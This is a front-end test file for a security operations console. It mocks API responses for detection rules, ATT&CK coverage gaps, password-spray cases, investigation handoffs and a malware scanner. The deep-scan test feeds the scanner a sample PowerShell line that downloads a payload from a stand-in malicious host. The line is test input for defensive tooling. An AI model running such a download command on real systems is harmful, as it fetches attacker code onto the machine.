import { describe, it, expect, vi, beforeEach } from 'vitest';
import { fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { AuthProvider, ToastProvider, ThemeProvider } from '../hooks.jsx';
import ThreatDetection from '../components/ThreatDetection.jsx';
import SOCWorkbench from '../components/SOCWorkbench.jsx';
import Infrastructure from '../components/Infrastructure.jsx';
import ReportsExports from '../components/ReportsExports.jsx';
import HelpDocs from '../components/HelpDocs.jsx';

globalThis.fetch = vi.fn();

function jsonResponse(body) {
  return {
    ok: true,
    headers: { get: () => 'application/json' },
    json: async () => body,
  };
}

async function defaultFetchImplementation(url) {
  if (String(url).includes('/api/content/rules'))
    return jsonResponse({
      rules: [
        {
          id: 'rule-1',
          title: 'Suspicious PowerShell',
          description: 'PowerShell execution with credential access patterns.',
          lifecycle: 'test',
          enabled: true,
          severity_mapping: 'high',
          attack: [
            {
              technique_id: 'T1110',
              technique_name: 'Brute Force',
              tactic: 'credential-access',
            },
          ],
          owner: 'secops',
          pack_ids: ['identity-attacks'],
          last_test_match_count: 2,
          last_test_at: '2024-01-01T00:00:00Z',
        },
      ],
    });
  if (String(url).includes('/api/content/packs'))
    return jsonResponse({
      packs: [
        {
          id: 'identity-attacks',
          name: 'Identity Attacks',
          description: 'Identity-focused detections and hunt workflows.',
          enabled: true,
          rule_ids: ['rule-1'],
          target_group: 'soc-analysts',
          saved_searches: ['failed logins by user'],
          recommended_workflows: ['credential-storm'],
          rollout_notes: 'Map identity content to analysts before broad rollout.',
          updated_at: '2024-01-01T00:00:00Z',
        },
      ],
    });
  if (String(url).includes('/api/efficacy/summary'))
    return jsonResponse({
      total_alerts_triaged: 24,
      overall_tp_rate: 0.63,
      overall_fp_rate: 0.29,
      overall_precision: 0.68,
      mean_triage_secs: 182,
      rules_tracked: 3,
      worst_rules: [
        {
          rule_id: 'rule-1',
          rule_name: 'Suspicious PowerShell',
          total_alerts: 12,
          true_positives: 6,
          false_positives: 4,
          benign: 1,
          inconclusive: 1,
          pending: 0,
          tp_rate: 0.55,
          fp_rate: 0.36,
          precision: 0.6,
          mean_triage_secs: 210,
          trend: 'Degrading',
        },
      ],
      best_rules: [
        {
          rule_id: 'rule-2',
          rule_name: 'Impossible Travel',
          total_alerts: 7,
          true_positives: 6,
          false_positives: 1,
          benign: 0,
          inconclusive: 0,
          pending: 0,
          tp_rate: 0.86,
          fp_rate: 0.14,
          precision: 0.86,
          mean_triage_secs: 95,
          trend: 'Improving',
        },
      ],
      by_severity: {
        high: {
          total: 10,
          tp_rate: 0.7,
          fp_rate: 0.2,
          mean_triage_secs: 160,
        },
        medium: {
          total: 8,
          tp_rate: 0.5,
          fp_rate: 0.38,
          mean_triage_secs: 210,
        },
      },
    });
  if (String(url).includes('/api/efficacy/rule/rule-1'))
    return jsonResponse({
      rule_id: 'rule-1',
      rule_name: 'Suspicious PowerShell',
      total_alerts: 12,
      true_positives: 6,
      false_positives: 4,
      benign: 1,
      inconclusive: 1,
      pending: 0,
      tp_rate: 0.55,
      fp_rate: 0.36,
      precision: 0.6,
      mean_triage_secs: 210,
      trend: 'Degrading',
    });
  if (String(url).includes('/api/coverage/mitre'))
    return jsonResponse({
      covered_techniques: 14,
      coverage_pct: 61,
    });
  if (String(url).includes('/api/coverage/gaps'))
    return jsonResponse({
      total_techniques: 23,
      covered: 14,
      uncovered: 9,
      coverage_pct: 61,
      gaps: [
        {
          technique_id: 'T1003',
          technique_name: 'OS Credential Dumping',
          tactic: 'credential-access',
          priority: 'High',
          recommendation: 'Add YARA rules for credential dumping tool signatures',
          suggested_sources: ['UEBA baseline', 'Auth log correlation'],
        },
        {
          technique_id: 'T1059',
          technique_name: 'Command and Scripting Interpreter',
          tactic: 'execution',
          priority: 'Critical',
          recommendation: 'Add Sigma rules for command-line interpreter usage',
          suggested_sources: ['Sigma rule', 'Process monitoring'],
        },
      ],
      by_tactic: [
        { tactic: 'credential-access', total: 4, covered: 1, uncovered: 3, pct: 25, gap_ids: ['T1003'] },
        { tactic: 'execution', total: 5, covered: 2, uncovered: 3, pct: 40, gap_ids: ['T1059'] },
      ],
      top_recommendations: [
        '[T1059] Command and Scripting Interpreter: Add Sigma rules for command-line interpreter usage',
      ],
    });
  if (String(url).includes('/api/hunts'))
    return jsonResponse({
      hunts: [
        {
          id: 'hunt-1',
          name: 'Credential Storm Hunt',
          lifecycle: 'canary',
          canary_percentage: 10,
          pack_id: 'identity-attacks',
          target_group: 'soc-analysts',
          severity: 'high',
          threshold: 1,
          suppression_window_secs: 0,
          query: { text: 'credential' },
        },
      ],
    });
  if (String(url).includes('/api/investigations/suggest'))
    return jsonResponse({
      suggestions: [
        {
          id: 'credential-storm',
          name: 'Investigate Credential Storm',
          description: 'Step through identity abuse triage.',
          severity: 'high',
          steps: [{ id: 'step-1' }],
          estimated_minutes: 30,
          mitre_techniques: ['T1110'],
        },
      ],
    });
  if (String(url).includes('/api/workbench/overview'))
    return jsonResponse({
      generated_at: '2024-01-01T00:00:00Z',
      queue: { pending: 2 },
      cases: { total: 1 },
      incidents: { total: 1 },
      response: { ready_to_execute: 1 },
      identity: {
        providers_configured: 1,
        ready_providers: 0,
        providers_with_gaps: 1,
        scim_status: 'warning',
        mapped_groups: 1,
        automation_targets_aligned: 0,
      },
      rollouts: {
        canary_rules: 1,
        canary_hunts: 1,
        promotion_ready_rules: 1,
        active_hunts: 1,
        rollout_targets: 1,
        average_canary_percentage: 10,
        historical_events: 2,
        rollback_events: 1,
        last_rollout_at: '2024-01-01T01:00:00Z',
        recent_history: [
          {
            id: 'rollout-1',
            action: 'deploy',
            version: '1.2.3',
            platform: 'linux',
            agent_id: 'agent-1',
            rollout_group: 'canary',
            status: 'assigned',
            requested_by: 'analyst-1',
            notes: 'Canary rollout',
            recorded_at: '2024-01-01T01:00:00Z',
          },
        ],
      },
      content: {
        packs: 1,
        enabled_packs: 1,
        hunt_library: 1,
        scheduled_hunts: 1,
        saved_searches: 3,
        packs_with_workflows: 1,
        latest_pack_update: '2024-01-01T00:00:00Z',
      },
      automation: {
        playbooks: 1,
        workflow_templates: 1,
        dynamic_templates: 1,
        active_executions: 1,
        pending_approvals: 1,
        success_rate: 0.5,
        avg_execution_ms: 450,
        active_investigations: 1,
        historical_runs: 3,
        last_execution_at: '2024-01-01T00:45:00Z',
        recent_history: [
          {
            execution_id: 'exec-1',
            playbook_id: 'credential-storm',
            alert_id: 'alert-1',
            executed_by: 'analyst-1',
            status: 'succeeded',
            started_at: '2024-01-01T00:40:00Z',
            finished_at: '2024-01-01T00:45:00Z',
            duration_ms: 450,
            step_count: 2,
            error: null,
            recorded_at: '2024-01-01T00:45:00Z',
          },
        ],
      },
      analytics: {
        api_requests: 10,
        api_error_rate: 0.05,
        unique_endpoints: 3,
        busiest_endpoint: 'POST /api/hunts',
        worst_p95_ms: 145,
        search_queries_total: 4,
        hunt_runs_total: 2,
        response_exec_total: 1,
        last_hunt_latency_ms: 220,
        last_response_latency_ms: 90,
      },
      urgent_items: [],
      hot_agents: [],
      recommendations: [
        {
          category: 'identity',
          priority: 'high',
          title: 'Complete identity routing',
          summary: 'Provider or SCIM validation still blocks clean group-based routing.',
          action_hint:
            'Review IdP and SCIM mappings before widening automated response coverage.',
        },
      ],
    });
  if (String(url).includes('/api/report-templates'))
    return jsonResponse({
      templates: [
        {
          id: 'tpl-1',
          name: 'Executive Status',
          kind: 'executive_status',
          scope: 'global',
          format: 'json',
          status: 'ready',
          audience: 'executive',
          description: 'Leadership snapshot',
        },
      ],
    });
  if (String(url).includes('/api/inbox')) return jsonResponse({ items: [] });
  return jsonResponse({});
}

beforeEach(() => {
  vi.clearAllMocks();
  globalThis.fetch.mockImplementation(defaultFetchImplementation);
});

function renderWithProviders(node, route = '/') {
  return render(
    <MemoryRouter initialEntries={[route]}>
      <AuthProvider>
        <ThemeProvider>
          <ToastProvider>{node}</ToastProvider>
        </ThemeProvider>
      </AuthProvider>
    </MemoryRouter>,
  );
}

describe('workspace shells', () => {
  it('renders the detection workspace shell', async () => {
    renderWithProviders(<ThreatDetection />, '/detection');
    expect(await screen.findByText('Detection Engineering Workspace')).toBeInTheDocument();
    expect(await screen.findByText('Automation Target')).toBeInTheDocument();
    fireEvent.click(await screen.findByText('Edit Primary Bundle'));
    expect(await screen.findByText('Save Bundle')).toBeInTheDocument();
  });

  it('renders efficacy, ATT&CK gap, suppression, and rollout drill-downs', async () => {
    renderWithProviders(<ThreatDetection />, '/detection');

    expect(await screen.findByText('Detection Efficacy Drilldown')).toBeInTheDocument();
    expect(await screen.findByText('Suppression Noise Signals')).toBeInTheDocument();
    expect(await screen.findByText('Content Pack Rollout Signals')).toBeInTheDocument();
    expect(await screen.findByText('Rule Efficacy')).toBeInTheDocument();
    expect((await screen.findAllByText('T1003 • OS Credential Dumping')).length).toBeGreaterThan(0);
    expect((await screen.findAllByText('Degrading')).length).toBeGreaterThan(0);
  });

  it('preserves the saved hunt id when reopening an existing hunt', async () => {
    renderWithProviders(<ThreatDetection />, '/detection');
    const huntName = (await screen.findAllByText('Credential Storm Hunt')).find(
      (element) => element.className === 'row-primary',
    );
    expect(huntName).toBeTruthy();
    const huntRow = huntName.parentElement?.parentElement;
    expect(huntRow).toBeTruthy();
    fireEvent.click(within(huntRow).getByText('Open'));
    fireEvent.click(await screen.findByText('Save Hunt'));

    await waitFor(() => {
      const saveCall = globalThis.fetch.mock.calls.find(
        ([url, options]) =>
          String(url).includes('/api/hunts') && options?.method === 'POST' && options?.body,
      );
      expect(saveCall).toBeTruthy();
      expect(JSON.parse(saveCall[1].body).id).toBe('hunt-1');
    });
  });

  it('promotes current hunt results into cases from the hunt drawer', async () => {
    const createCaseBodies = [];

    globalThis.fetch.mockImplementation(async (url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/hunts/hunt-1/run') && method === 'POST') {
        return jsonResponse({
          matches: [{ hostname: 'host-9', agent_id: 'agent-9', score: 0.92 }],
          total: 1,
        });
      }
      if (href.includes('/api/cases') && method === 'POST') {
        createCaseBodies.push(JSON.parse(options.body));
        return jsonResponse({ id: 88, status: 'created' });
      }

      return defaultFetchImplementation(url, options);
    });

    renderWithProviders(<ThreatDetection />, '/detection');

    const huntName = (await screen.findAllByText('Credential Storm Hunt')).find(
      (element) => element.className === 'row-primary',
    );
    expect(huntName).toBeTruthy();
    const huntRow = huntName.parentElement?.parentElement;
    expect(huntRow).toBeTruthy();

    fireEvent.click(within(huntRow).getByText('Run'));
    expect(await screen.findByText('Latest Hunt Result')).toBeInTheDocument();

    fireEvent.click(await screen.findByRole('button', { name: 'Promote to Case' }));

    await waitFor(() => {
      expect(createCaseBodies).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            priority: 'high',
            title: 'Hunt Suspicious PowerShell',
          }),
        ]),
      );
    });

    expect(await screen.findByRole('button', { name: 'Open Linked Case' })).toBeInTheDocument();
  });

  it('renders the SOC workbench program overview', async () => {
    renderWithProviders(<SOCWorkbench />, '/soc');
    expect(await screen.findByText('Recommendation Queue')).toBeInTheDocument();
    expect((await screen.findAllByText('Complete identity routing')).length).toBeGreaterThan(0);
    expect(await screen.findByText('Historical Runs')).toBeInTheDocument();
  });

  it('syncs a focused case to external ticketing from the cases workspace', async () => {
    const ticketBodies = [];
    const caseCommentBodies = [];
    const cases = [
      {
        id: 42,
        title: 'Identity escalation case',
        description: 'Unusual Okta password spray followed by MFA challenge failures.',
        status: 'investigating',
        priority: 'high',
        assignee: 'analyst-1',
        created_at: '2024-01-01T00:00:00Z',
        updated_at: '2024-01-01T00:15:00Z',
        incident_ids: [7],
        event_ids: [1001, 1002],
        tags: ['identity', 'okta'],
        comments: [
          {
            author: 'analyst-1',
            timestamp: '2024-01-01T00:12:00Z',
            text: 'Containment started with targeted password resets.',
          },
        ],
        evidence: [
          {
            kind: 'event',
            reference_id: 'evt-1001',
            description: 'Auth event bundle',
            added_at: '2024-01-01T00:10:00Z',
          },
        ],
        mitre_techniques: ['T1110'],
      },
    ];

    globalThis.fetch.mockImplementation(async (url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/cases/stats')) {
        return jsonResponse({ total: 1, by_status: { investigating: 1 }, by_priority: { high: 1 } });
      }
      if (href.includes('/api/cases') && method === 'GET') {
        return jsonResponse({ cases });
      }
      if (href.includes('/api/cases/42/comment') && method === 'POST') {
        const body = JSON.parse(options.body);
        caseCommentBodies.push(body);
        cases[0] = {
          ...cases[0],
          comments: [
            ...cases[0].comments,
            {
              author: 'analyst',
              timestamp: '2024-01-01T00:20:00Z',
              text: body.comment,
            },
          ],
        };
        return jsonResponse({ status: 'ok' });
      }
      if (href.includes('/api/tickets/sync') && method === 'POST') {
        ticketBodies.push(JSON.parse(options.body));
        return jsonResponse({
          status: 'synced',
          sync: {
            id: 'sync-1',
            provider: 'servicenow',
            object_kind: 'case',
            object_id: '42',
            queue_or_project: 'SECOPS',
            summary: 'Escalate identity investigation to the service desk',
          },
        });
      }

      return defaultFetchImplementation(url, options);
    });

    renderWithProviders(<SOCWorkbench />, '/soc?case=42#cases');

    expect(await screen.findByText('Focused Case Workspace')).toBeInTheDocument();
    expect((await screen.findAllByText(/Unusual Okta password spray/)).length).toBeGreaterThan(0);
    expect(await screen.findByText('Incident #7')).toBeInTheDocument();
    expect((await screen.findAllByText('T1110')).length).toBeGreaterThan(0);
    expect((await screen.findAllByText('Auth event bundle')).length).toBeGreaterThan(0);
    expect(
      (await screen.findAllByText(/Containment started with targeted password resets/i)).length,
    ).toBeGreaterThan(0);
    expect(await screen.findByText('Ticket Sync')).toBeInTheDocument();

    fireEvent.change(screen.getByLabelText('Add case note'), {
      target: { value: 'Validated that MFA prompts were blocked tenant-wide.' },
    });
    fireEvent.click(screen.getByRole('button', { name: 'Post Case Note' }));

    await waitFor(() => {
      expect(caseCommentBodies).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            comment: 'Validated that MFA prompts were blocked tenant-wide.',
          }),
        ]),
      );
    });

    expect(
      (await screen.findAllByText(/Validated that MFA prompts were blocked tenant-wide/i)).length,
    ).toBeGreaterThan(0);

    fireEvent.change(screen.getByLabelText('Ticketing provider'), {
      target: { value: 'servicenow' },
    });
    fireEvent.change(screen.getByLabelText('Project or queue'), {
      target: { value: 'SECOPS' },
    });
    fireEvent.change(screen.getByLabelText('Sync summary'), {
      target: { value: 'Escalate identity investigation to the service desk' },
    });
    fireEvent.click(screen.getByRole('button', { name: 'Sync Case' }));

    await waitFor(() => {
      expect(ticketBodies).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            provider: 'servicenow',
            object_kind: 'case',
            object_id: '42',
            queue_or_project: 'SECOPS',
            summary: 'Escalate identity investigation to the service desk',
          }),
        ]),
      );
    });

    expect(await screen.findByText('Last ticket sync')).toBeInTheDocument();
  });

  it('opens a URL-addressable incident drawer from the case workspace', async () => {
    const cases = [
      {
        id: 42,
        title: 'Identity escalation case',
        description: 'Unusual Okta password spray followed by MFA challenge failures.',
        status: 'investigating',
        priority: 'high',
        assignee: 'analyst-1',
        incident_ids: [7],
        event_ids: [1001, 1002],
        tags: ['identity', 'okta'],
        comments: [],
        evidence: [],
        mitre_techniques: ['T1110'],
      },
    ];
    const incidents = [
      {
        id: 7,
        title: 'Password spray incident',
        severity: 'high',
        status: 'open',
        created: '2024-01-01T00:00:00Z',
      },
    ];

    globalThis.fetch.mockImplementation(async (url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/cases/stats')) {
        return jsonResponse({ total: 1, by_status: { investigating: 1 }, by_priority: { high: 1 } });
      }
      if (href.includes('/api/cases') && method === 'GET') {
        return jsonResponse({ cases });
      }
      if (href.endsWith('/api/incidents') || href.includes('/api/incidents?')) {
        return jsonResponse({ incidents });
      }
      if (href.includes('/api/incidents/7/storyline')) {
        return jsonResponse({
          events: [
            {
              timestamp: '2024-01-01T00:03:00Z',
              description: 'MFA failures spiked across the target tenant.',
            },
          ],
        });
      }
      if (href.includes('/api/incidents/7') && !href.includes('/storyline')) {
        return jsonResponse({
          id: 7,
          title: 'Password spray incident',
          severity: 'high',
          status: 'open',
          summary: 'Identity abuse escalated from password spray into MFA fatigue.',
          created: '2024-01-01T00:00:00Z',
          updated: '2024-01-01T00:05:00Z',
          owner: 'analyst-1',
          case_id: 42,
          event_ids: ['evt-2001'],
          alert_ids: ['alert-77'],
          agent_ids: ['agent-9'],
        });
      }

      return defaultFetchImplementation(url, options);
    });

    renderWithProviders(
      <SOCWorkbench />,
      '/soc?case=42&incident=7&drawer=incident-detail&incidentPanel=storyline#cases',
    );

    const drawer = await screen.findByRole('dialog', { name: /incident workspace/i });
    expect(
      (await within(drawer).findAllByText('MFA failures spiked across the target tenant.')).length,
    ).toBeGreaterThan(0);

    fireEvent.click(within(drawer).getByRole('button', { name: 'Actions' }));

    expect(await within(drawer).findByRole('button', { name: 'Open Linked Case' })).toBeInTheDocument();
    expect(
      await within(drawer).findByRole('button', { name: 'Open Response Workspace' }),
    ).toBeInTheDocument();
  });

  it('opens a URL-addressable case drawer and posts notes from the drawer evidence panel', async () => {
    const caseCommentBodies = [];
    const cases = [
      {
        id: 42,
        title: 'Identity escalation case',
        description: 'Unusual Okta password spray followed by MFA challenge failures.',
        status: 'investigating',
        priority: 'high',
        assignee: 'analyst-1',
        created_at: '2024-01-01T00:00:00Z',
        updated_at: '2024-01-01T00:15:00Z',
        incident_ids: [7],
        event_ids: [1001, 1002],
        tags: ['identity', 'okta'],
        comments: [
          {
            author: 'analyst-1',
            timestamp: '2024-01-01T00:12:00Z',
            text: 'Containment started with targeted password resets.',
          },
        ],
        evidence: [
          {
            kind: 'event',
            reference_id: 'evt-1001',
            description: 'Auth event bundle',
            added_at: '2024-01-01T00:10:00Z',
          },
        ],
        mitre_techniques: ['T1110'],
      },
    ];

    globalThis.fetch.mockImplementation(async (url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/cases/stats')) {
        return jsonResponse({ total: 1, by_status: { investigating: 1 }, by_priority: { high: 1 } });
      }
      if (href.includes('/api/cases') && method === 'GET') {
        return jsonResponse({ cases });
      }
      if (href.includes('/api/cases/42/comment') && method === 'POST') {
        const body = JSON.parse(options.body);
        caseCommentBodies.push(body);
        cases[0] = {
          ...cases[0],
          comments: [
            ...cases[0].comments,
            {
              author: 'analyst',
              timestamp: '2024-01-01T00:20:00Z',
              text: body.comment,
            },
          ],
        };
        return jsonResponse({ status: 'ok' });
      }

      return defaultFetchImplementation(url, options);
    });

    renderWithProviders(
      <SOCWorkbench />,
      '/soc?case=42&drawer=case-workspace&casePanel=evidence#cases',
    );

    const drawer = await screen.findByRole('dialog', { name: /case workspace/i });
    expect(await within(drawer).findByText('Auth event bundle')).toBeInTheDocument();
    expect(
      await within(drawer).findByText(/Containment started with targeted password resets/i),
    ).toBeInTheDocument();

    fireEvent.change(within(drawer).getByLabelText('Add case note (drawer)'), {
      target: { value: 'Escalated identity scope confirmed from the drawer workflow.' },
    });
    fireEvent.click(within(drawer).getByRole('button', { name: 'Post Case Note' }));

    await waitFor(() => {
      expect(caseCommentBodies).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            comment: 'Escalated identity scope confirmed from the drawer workflow.',
          }),
        ]),
      );
    });

    expect(
      (
        await within(drawer).findAllByText(
          /Escalated identity scope confirmed from the drawer workflow./i,
        )
      ).length,
    ).toBeGreaterThan(0);

    fireEvent.click(within(drawer).getByRole('button', { name: 'Actions' }));
    expect(
      await within(drawer).findByRole('button', { name: 'Open Response Workspace' }),
    ).toBeInTheDocument();
  });

  it('tracks investigation progress and handoff inside the SOC workbench', async () => {
    const workflows = [
      {
        id: 'credential-storm',
        name: 'Investigate Credential Storm',
        description: 'Step through identity abuse triage.',
        severity: 'high',
        estimated_minutes: 30,
        mitre_techniques: ['T1110'],
        steps: [{ order: 1 }, { order: 2 }],
      },
    ];
    const cases = [
      {
        id: 42,
        title: 'Identity escalation case',
        assignee: 'analyst-1',
        comments: [],
      },
    ];
    const activeInvestigations = [
      {
        id: 'inv-7',
        workflow_id: 'credential-storm',
        workflow_name: 'Investigate Credential Storm',
        workflow_description: 'Step through identity abuse triage.',
        workflow_severity: 'high',
        analyst: 'analyst-1',
        case_id: '42',
        started_at: '2024-01-01T00:00:00Z',
        updated_at: '2024-01-01T00:00:00Z',
        status: 'in-progress',
        completed_steps: [],
        notes: {},
        findings: [],
        total_steps: 2,
        completion_percent: 0,
        completion_criteria: ['Reset targeted credentials', 'Block the source IP range'],
        next_step: {
          order: 1,
          title: 'Validate account lockouts',
          description: 'Review sign-in telemetry for the sprayed identities.',
        },
        steps: [
          {
            order: 1,
            title: 'Validate account lockouts',
            description: 'Review sign-in telemetry for the sprayed identities.',
            recommended_actions: ['Review lockout cadence and impossible travel alerts'],
            evidence_to_collect: ['Auth logs', 'VPN source IP list'],
            auto_queries: [
              {
                name: 'Launch Hunt',
                endpoint: '/api/events/search',
                description: 'Pivot into the hunt workspace for auth events.',
              },
            ],
            api_pivot: '/api/events/search',
          },
          {
            order: 2,
            title: 'Confirm containment',
            description: 'Verify resets and IP blocks were applied everywhere.',
            recommended_actions: ['Check account reset timestamps'],
            evidence_to_collect: ['Identity provider audit trail'],
            auto_queries: [],
            api_pivot: '/api/response/request',
          },
        ],
        handoff: null,
      },
    ];
    const progressBodies = [];
    const handoffBodies = [];

    globalThis.fetch.mockImplementation(async (url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/cases/stats')) {
        return jsonResponse({ total: cases.length, by_status: {}, by_priority: {} });
      }
      if (href.includes('/api/cases')) {
        return jsonResponse({ cases });
      }
      if (href.includes('/api/investigations/workflows')) {
        return jsonResponse(workflows);
      }
      if (href.includes('/api/investigations/active')) {
        return jsonResponse(activeInvestigations);
      }
      if (href.includes('/api/investigations/progress') && method === 'POST') {
        const body = JSON.parse(options.body);
        progressBodies.push(body);
        const snapshot = activeInvestigations[0];

        if (typeof body.step === 'number') {
          if (body.completed === true && !snapshot.completed_steps.includes(body.step)) {
            snapshot.completed_steps = [...snapshot.completed_steps, body.step];
          }
          if (body.completed === false) {
            snapshot.completed_steps = snapshot.completed_steps.filter((step) => step !== body.step);
          }
          if (typeof body.note === 'string') {
            snapshot.notes = { ...snapshot.notes, [body.step]: body.note };
          }
        }

        if (body.finding) {
          snapshot.findings = [...snapshot.findings, body.finding];
        }

        snapshot.completion_percent = Math.round(
          (snapshot.completed_steps.length / snapshot.total_steps) * 100,
        );
        snapshot.next_step =
          snapshot.steps.find((step) => !snapshot.completed_steps.includes(step.order)) || null;
        snapshot.updated_at = '2024-01-01T00:05:00Z';

        return jsonResponse(snapshot);
      }
      if (href.includes('/api/investigations/handoff') && method === 'POST') {
        const body = JSON.parse(options.body);
        handoffBodies.push(body);
        const snapshot = activeInvestigations[0];
        snapshot.status = 'handoff-ready';
        snapshot.analyst = body.to_analyst;
        snapshot.handoff = {
          from_analyst: 'analyst-1',
          to_analyst: body.to_analyst,
          summary: body.summary,
          next_actions: body.next_actions,
          questions: body.questions,
          updated_at: '2024-01-01T00:10:00Z',
        };
        snapshot.updated_at = '2024-01-01T00:10:00Z';
        cases[0] = {
          ...cases[0],
          assignee: body.to_analyst,
          comments: [
            ...cases[0].comments,
            {
              author: 'analyst-1',
              timestamp: '2024-01-01T00:10:00Z',
              text: `Investigation handoff from analyst-1 to ${body.to_analyst}`,
            },
          ],
        };
        return jsonResponse(snapshot);
      }

      return defaultFetchImplementation(url, options);
    });

    renderWithProviders(<SOCWorkbench />, '/soc');
    fireEvent.click(await screen.findByRole('button', { name: 'Investigations' }));

    expect(await screen.findByText('Active Investigations')).toBeInTheDocument();
    expect((await screen.findAllByText('Investigate Credential Storm')).length).toBeGreaterThan(0);
    expect((await screen.findAllByRole('button', { name: 'Open Primary Pivot' })).length).toBeGreaterThan(0);

    const noteFields = await screen.findAllByLabelText('Analyst note');
    fireEvent.change(noteFields[0], { target: { value: 'VPN telemetry reviewed' } });
    fireEvent.click(screen.getAllByRole('button', { name: 'Save Note' })[0]);

    await waitFor(() => {
      expect(progressBodies).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ step: 1, note: 'VPN telemetry reviewed' }),
        ]),
      );
    });

    fireEvent.click(screen.getAllByRole('button', { name: 'Mark Complete' })[0]);

    await waitFor(() => {
      expect(progressBodies).toEqual(
        expect.arrayContaining([expect.objectContaining({ step: 1, completed: true })]),
      );
    });
    expect(await screen.findByRole('button', { name: 'Reopen' })).toBeInTheDocument();

    fireEvent.change(screen.getByLabelText('Handoff target'), {
      target: { value: 'analyst-2' },
    });
    fireEvent.change(screen.getByLabelText('Summary'), {
      target: { value: 'Containment is stable, but identity scope still needs confirmation.' },
    });
    fireEvent.change(screen.getByLabelText('Next actions'), {
      target: { value: 'Confirm all resets\nValidate VPN blocks' },
    });
    fireEvent.change(screen.getByLabelText('Open questions'), {
      target: { value: 'Was MFA bypassed?' },
    });
    fireEvent.click(screen.getByRole('button', { name: 'Hand Off Investigation' }));

    await waitFor(() => {
      expect(handoffBodies).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            to_analyst: 'analyst-2',
            summary: 'Containment is stable, but identity scope still needs confirmation.',
          }),
        ]),
      );
    });

    expect((await screen.findAllByText('Handoff Ready')).length).toBeGreaterThan(0);
    expect(await screen.findByText(/currently assigned to analyst-2/i)).toBeInTheDocument();
    expect(await screen.findByText(/analyst-1 handed this workflow to analyst-2/i)).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: 'Open Response' }));

    expect(await screen.findByText('Workflow handoff context')).toBeInTheDocument();
    expect(await screen.findByText(/Identity escalation case/)).toBeInTheDocument();
    expect(await screen.findByRole('button', { name: 'Open Investigation' })).toBeInTheDocument();
  });

  it('runs deep malware scan from the infrastructure integrity workspace', async () => {
    const scanBodies = [];
    const sample = 'powershell Invoke-WebRequest https://malicious.example/payload';

    globalThis.fetch.mockImplementation(async (url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/malware/stats')) {
        return jsonResponse({
          database: { total_hashes: 12, by_family: { LockBit: 2 }, by_severity: { critical: 2 } },
          scanner: {
            total_scans: 5,
            malicious_count: 2,
            suspicious_count: 1,
            clean_count: 2,
            avg_scan_time_us: 1200,
          },
          yara_rules: 4,
        });
      }
      if (href.includes('/api/malware/recent')) {
        return jsonResponse([
          {
            sha256: 'abc123',
            name: 'LockBit Loader',
            family: 'LockBit',
            severity: 'critical',
            detected_at: '2024-01-01T00:00:00Z',
            source: 'built-in',
          },
        ]);
      }
      if (href.includes('/api/scan/buffer/v2') && method === 'POST') {
        const body = JSON.parse(options.body);
        scanBodies.push(body);
        return jsonResponse({
          scan: {
            verdict: 'malicious',
            confidence: 0.91,
            malware_family: 'Loader',
            static_score: {
              score: 84,
              band: 'likely_malicious',
              rationale: ['Behavior and script indicators raised confidence.'],
            },
            matches: [
              {
                layer: 'behavior',
                rule_name: 'runtime_behavior',
                severity: 'high',
                detail: 'observed tactics: suspicious_process_tree, c2_beaconing',
              },
            ],
          },
          static_profile: {
            file_type: 'powershell',
            platform_hint: 'script',
            probable_signed: false,
            trusted_publisher_match: 'microsoft',
            internal_tool_match: null,
            suspicious_traits: ['script-like content benefits from command inspection'],
            analyst_summary: ['Detected powershell content for the script execution surface.'],
          },
          behavior_profile: {
            severity: 'high',
            observed_tactics: ['suspicious_process_tree', 'c2_beaconing'],
            allowlist_match: 'microsoft',
            recommended_actions: [
              'Review script body for network, credential, and persistence commands.',
              'Pivot to NDR beaconing results for related destinations.',
            ],
          },
          analyst_summary: [
            'Verdict: malicious with 91% confidence.',
            'Detected powershell content for the script execution surface.',
          ],
        });
      }

      return defaultFetchImplementation(url, options);
    });

    renderWithProviders(<Infrastructure />, '/infrastructure?tab=integrity');

    expect(await screen.findByText('Deep Malware Scan')).toBeInTheDocument();
    expect(await screen.findByText('Recent Malware Triage')).toBeInTheDocument();
    expect((await screen.findAllByText('LockBit Loader')).length).toBeGreaterThan(0);

    fireEvent.change(screen.getByLabelText('Sample filename'), {
      target: { value: 'invoice_update.ps1' },
    });
    fireEvent.change(screen.getByLabelText('Sample content or script body'), {
      target: { value: sample },
    });
    fireEvent.click(screen.getByLabelText('Suspicious process tree'));
    fireEvent.click(screen.getByLabelText('C2 beaconing'));
    fireEvent.change(screen.getByLabelText('Trusted publishers'), {
      target: { value: 'microsoft' },
    });
    fireEvent.change(screen.getByLabelText('Internal tools'), {
      target: { value: 'corp-updater' },
    });
    fireEvent.click(screen.getByRole('button', { name: 'Run Deep Scan' }));

    await waitFor(() => {
      expect(scanBodies).toEqual([
        {
          data: Buffer.from(sample).toString('base64'),
          filename: 'invoice_update.ps1',
          behavior: {
            suspicious_process_tree: true,
            defense_evasion: false,
            persistence_installed: false,
            c2_beaconing_detected: true,
            credential_access: false,
          },
          allowlist: {
            trusted_publishers: ['microsoft'],
            internal_tools: ['corp-updater'],
          },
        },
      ]);
    });

    expect((await screen.findAllByText(/malicious/i)).length).toBeGreaterThan(0);
    expect((await screen.findAllByText(/powershell/i)).length).toBeGreaterThan(0);
    expect(await screen.findByText(/Trusted publisher allowlist matched "microsoft"/i)).toBeInTheDocument();
    expect((await screen.findAllByText(/Pivot to NDR beaconing results/i)).length).toBeGreaterThan(0);
  });

  it('renders the infrastructure explorer shell', async () => {
    renderWithProviders(<Infrastructure />, '/infrastructure');
    expect(await screen.findByText('Attention Queues')).toBeInTheDocument();
  });

  it('renders the report center shell', async () => {
    renderWithProviders(<ReportsExports />, '/reports');
    expect(await screen.findByText('Report Center')).toBeInTheDocument();
  });

